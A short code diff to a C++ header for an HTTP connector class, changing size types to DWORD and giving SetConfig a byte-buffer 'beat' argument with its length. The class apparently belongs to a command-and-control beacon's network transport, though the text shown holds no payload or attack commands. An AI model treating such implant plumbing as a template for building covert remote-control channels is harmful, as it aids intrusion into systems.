@@ -57,7 +57,7 @@ class ConnectorHTTP
 	ULONG  ans_pre_size   = 0;
 
 	BYTE* recvData = NULL;
-	ULONG recvSize = 0;
+	DWORD recvSize = 0;
 
 	HTTPFUNC* functions = NULL;
 
@@ -69,11 +69,11 @@ class ConnectorHTTP
 public:
 	ConnectorHTTP();
 
-	void SetConfig(ProfileHTTP profile, CHAR* beat);
+	BOOL SetConfig(ProfileHTTP profile, BYTE* beat, ULONG beatSize);
 	void CloseConnector();
 
 	void  SendData(BYTE* data, ULONG data_size);
 	BYTE* RecvData();
-	ULONG RecvSize();
+	DWORD RecvSize();
 	void  RecvClear();
 };
